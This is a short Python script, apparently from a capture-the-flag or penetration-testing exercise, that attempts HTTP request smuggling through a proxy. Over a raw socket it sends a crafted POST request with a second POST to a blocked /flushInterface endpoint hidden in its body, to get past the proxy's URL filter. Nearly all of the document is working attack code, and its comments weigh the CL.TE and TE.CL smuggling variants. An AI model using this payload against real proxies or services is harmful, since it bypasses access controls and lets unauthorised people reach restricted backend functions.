#!/usr/bin/env python3
"""
Test HTTP request smuggling to bypass /flushInterface check
"""
import socket

def test_smuggling(proxy_host, proxy_port):
    """Test if we can use HTTP request smuggling"""
    
    # The idea: send a request where the proxy sees one URL
    # but the backend sees /flushInterface
    
    # Request 1: Something that doesn't contain "flushinterface"
    # Request 2: The actual /flushInterface request
    
    # But we need to be careful about Content-Length and parsing
    
    backend_host = "127.0.0.1"  # Will be blocked, but let's test the concept
    backend_port = 5000
    
    # Try CL.TE (Content-Length, Transfer-Encoding) smuggling
    # Or TE.CL (Transfer-Encoding, Content-Length) smuggling
    
    # Actually, the proxy might not support Transfer-Encoding
    # Let's try a simpler approach: send two requests in one
    
    payload = f"""POST /test HTTP/1.1\r
Host: {backend_host}:{backend_port}\r
Content-Length: 100\r
\r
POST /flushInterface HTTP/1.1\r
Host: {backend_host}:{backend_port}\r
Content-Length: 25\r
Content-Type: application/json\r
\r
{{"interface": "eth0"}}"""
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((proxy_host, proxy_port))
    s.sendall(payload.encode())
    
    response = b""
    while True:
        data = s.recv(4096)
        if not data:
            break
        response += data
    s.close()
    
    return response.decode('utf-8', errors='ignore')

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 smuggle_test.py <proxy_host:port>")
        sys.exit(1)
    
    target = sys.argv[1].split(':')
    result = test_smuggling(target[0], int(target[1]))
    print(result)

